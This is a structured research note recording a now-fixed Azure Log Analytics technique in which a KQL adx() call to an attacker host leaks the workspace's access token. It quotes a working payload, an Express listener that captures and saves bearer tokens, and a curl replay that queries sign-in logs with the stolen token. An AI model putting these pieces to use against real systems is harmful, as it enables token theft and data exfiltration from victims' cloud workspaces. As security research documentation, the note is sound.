STATUS: UNVERIFIED (not reproduced — no Azure Monitor workspace was queried and no listener was stood up this pass; every quote and code line below is verbatim from the article). NOTE: MSRC confirmed the behaviour as BY DESIGN at the time and a fix was issued on 2022-05-06; the technique is recorded as a METHOD, not as a live bug.
CLASS: sensitive information disclosure / access-token theft via a query-language EXTERNAL-DATA function — the KQL `adx()` operator accepts an arbitrary cluster URL and the query engine authenticates to it with the WORKSPACE'S OWN JWT, so the token is sent to the attacker's listener (CWE-200 / CWE-918 / CWE-20).
CORE METHOD:
  1. THE PRINCIPLE, verbatim: "Malicious KQL query is injection technique, where attacker with targetable workspace resourceID can inject **listener** of access tokens in the query. The attacker then uses the gained access token to exfiltrate data from the workspace"
  2. THE MECHANISM, verbatim: "adx() methods allows us to query for data in Azure Data Explorer workspaces, but it also allows us to define an arbitrary url as the ADX cluster address. Since the authentication to ADX is done with JWT token, the JWT token gets exposed in this process. This JWT token in turn is good to be used as cross-workspace query from [public demo instance] the the attacker will be using."
  3. THE PAYLOAD, verbatim (the `adx()` call inside an otherwise-normal Log Analytics query): `let moreLogs = adx('https://ds.dewi.red:8443/Samples').StormEvents | take 1;`
  4. THE LISTENER, verbatim (a Node.js Express MITM route that captures the `Authorization` header):
     `app.use('/*', async (req,res) => {`
     `    console.log(decode(req.headers.authorization.split('Bearer ')[1],{complete:true}))`
     `    console.log(req.body,req.method,req.headers)`
     `    require('fs').writeFileSync('tkn.txt',req.headers.authorization.split('Bearer ')[1])`
     `    delete req.headers.host`
     `    try { var {data, headers} = await axios({ method:"post", url:"https://help.kusto.windows.net/v1/rest/mgmt", headers:req.headers, data: req.body }); ...`
  5. THE TOKEN REPLAY, verbatim (the curl the attacker runs outside the MITM, using the captured token):
     `token=$(cat tkn.txt)`
     `ws="subscriptions/3539d2a2-cd25-48c6-b295-14e69334ef1c/resourceGroups/rg-laws/providers/Microsoft.OperationalInsights/workspaces/hublaws/"`
     `curl "https://ade.loganalytics.io/${ws}/v2/rest/query" -H "authorization: Bearer ${token}" -H 'content-type: application/json; charset=UTF-8' -H 'accept: application/json' --data-raw '{"db":"hublaws","csl":"SigninLogs\r\n| take 10","properties":{"Options":{"servertimeout":"00:04:00","queryconsistency":"strongconsistency","query_language":"csl","request_readonly":false,"request_readonly_hardline":false}}}' --compressed`
  6. THE SCOPE, verbatim: "**Sensitive information disclosure** – Access token is leaked as soon as the admin runs the query" and "**Data exfiltration** – This requires that the attacker knows where to direct the query (needs to know the resourceId besides using the access token)".
  7. THE MITIGATING FACTOR, verbatim: "As this is by design, it should not be considered as a severe attack type. There are mitigating factors, such as (at least in my PoC) that the attacker needs to know the Log Analytics Workspace resourceID, before the attack can be made **complete** – That being said, I would still be careful about pasting random queries into workspaces and inspect them for operators, that allow external sources of data. Also it is worth noting, that even without ResourceID, I get valid access token, as soon as the victim runs the query"
  8. THE FIX, verbatim: "**Update** – 06.05.2022 - It seems that fix has now been issued changing the previous by-design behaviour. This makes Log Analytics use a lot safer, in terms of running queries in the workspace ✅"
